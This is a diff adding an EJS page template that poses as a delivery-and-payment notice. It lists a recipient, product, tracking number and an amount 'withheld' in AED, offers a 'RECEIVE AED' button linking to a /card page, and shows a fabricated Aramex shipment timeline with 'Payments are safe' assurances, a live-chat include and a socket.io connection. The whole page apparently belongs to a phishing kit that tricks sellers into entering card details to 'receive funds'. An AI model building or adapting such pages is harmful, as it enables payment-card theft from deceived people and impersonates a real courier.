@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>
+    <%= title %>
+  </title>
+  <link rel="stylesheet" href="/stylesheets/output.css">
+  <link rel='stylesheet' href='/stylesheets/style.css' />
+  <%- include("./includes/jivochat.ejs") %>
+
+</head>
+
+<body class="bg-[#F3F2F2] roboto">
+  <%- include("./includes/navbar.ejs") %>
+
+    <div class="container max-w-7xl mx-auto lg:flex justify-between">
+      <div class="w-full mx-3">
+        <p class="font-light text-2xl my-5">Information</p>
+        <div class="bg-white py-5 px-5 rounded-md shadow-md">
+          <div class="flex">
+            <table class="min-w-full bg-transparent">
+              <tbody>
+                <!-- Table rows go here -->
+                <tr>
+                  <!-- First Column (Custom Table Head) -->
+                  <td class="whitespace-nowrap">Recipient Name:</td>
+                  <!-- Second Column (Data) -->
+                  <td class="whitespace-nowrap">
+                    <%= order.person_name %>
+                  </td>
+                </tr>
+                <tr>
+                  <td class="whitespace-nowrap">Product Name: </td>
+                  <td class="whitespace-nowrap">
+                    <%= order.product_name %>
+                  </td>
+                </tr>
+                <tr>
+                  <td class="whitespace-nowrap">Tracking Number: </td>
+                  <td class="whitespace-nowrap">
+                    <%= order.track_number %>
+                  </td>
+                </tr>
+                <tr>
+                  <td class="whitespace-nowrap">Delivery Address:</td>
+                  <td class="whitespace-nowrap">
+                    <%= order.delivery_address %>
+                  </td>
+                </tr>
+                <tr>
+                  <td class="whitespace-nowrap">Phone number:</td>
+                  <td class="whitespace-nowrap">
+                    <%= order.phone_number %>
+                  </td>
+                </tr>
+                <tr>
+                  <td class="whitespace-nowrap">Amount withheld:</td>
+                  <td class="whitespace-nowrap">
+                    <%= order.amount_held %>
+                  </td>
+                </tr>
+                <!-- Add more rows as needed -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+        <p class="font-light text-2xl my-5">Receiving funds</p>
+        <div class="bg-white rounded-md shadow-md">
+          <div class="flex">
+            <div class="flex bg-[#E3E3E3] py-3 px-5 w-full items-center justify-center rounded-t-md">
+              <img src="/images/truck.svg" alt="truck">
+              <div class="mx-4">
+                <p class="font-medium">Your order has been created!</p>
+                <p class="font-medium">The delivery is paid by the customer</p>
+              </div>
+            </div>
+          </div>
+          <div class="py-5 px-5">
+            <div class="flex justify-center mt-2">
+              <a href="/card"><button
+                  class="bg-[#DC291E] outline-none border-none py-2 px-10 text-white font-medium rounded-lg">
+                  RECEIVE AED <%= order.amount_held %>
+                </button></a>
+            </div>
+            <div class="flex justify-center my-3">
+              <img src="/images/shield.png" alt="shield" class="h-10">
+              <p class="my-auto">Payments are safe</p>
+            </div>
+            <p class="text-xs mt-5 text-center">By clicking the "Receive funds" button, you accept the terms of the User
+              Agreement
+              using
+              the "Secure
+              Transaction" online service</p>
+          </div>
+        </div>
+      </div>
+      <div class="w-full mx-3">
+        <p class="font-light text-2xl my-5">Tracking</p>
+        <div class="bg-white rounded-md shadow-md">
+          <div class="flex justify-center border-b-[1px] border-b-gray-300 py-2">
+            <p class="font-light text-xl text-gray-400">Shipment №<%= order.track_number %>
+            </p>
+          </div>
+          <ul id="status-list" class="py-5 px-5">
+            <li class="mt-1"><span class="dot completed-dot"></span>A shipment has been created</li>
+            <li><span class="red-line"></span></li>
+            <li class="mt-1"><span class="dot completed-dot"></span>Awaiting payment</li>
+            <li><span class="red-line"></span></li>
+            <li class="mt-1"><span class="dot completed-dot"></span>The package is paid</li>
+            <li><span class="red-line"></span></li>
+            <li class="mt-1"><span class="dot active-dot"></span>Funds are ready to be deposited</li>
+            <li><span class="red-line"></span></li>
+            <li class="mt-1"><span class="dot"></span>The package has been picked up by Aramex</li>
+            <li><span class="red-line"></span></li>
+            <li class="mt-1"><span class="dot"></span>The package has been delivered to the recipient</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+    <script>
+      const socket = io();
+    </script>
+</body>
+
+</html>
